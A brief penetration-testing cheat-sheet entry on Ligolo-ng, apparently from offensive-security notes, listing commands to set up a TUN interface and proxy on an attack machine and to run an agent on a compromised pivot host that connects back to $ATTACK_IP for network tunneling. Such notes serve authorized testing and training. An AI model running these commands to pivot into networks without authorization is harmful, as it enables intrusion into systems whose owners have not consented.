# Ligolo-ng (Advanced Tunneling)

Creates a TUN interface on the attacker machine for seamless network access, including UDP and ICMP.

```bash
# On attack machine
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.0.0.0/24 dev ligolo
./proxy -selfcert

# On pivot
./agent -connect $ATTACK_IP:11601 -ignore-cert

# In proxy console
ligolo-ng » session
[Agent: MS01] » start
```
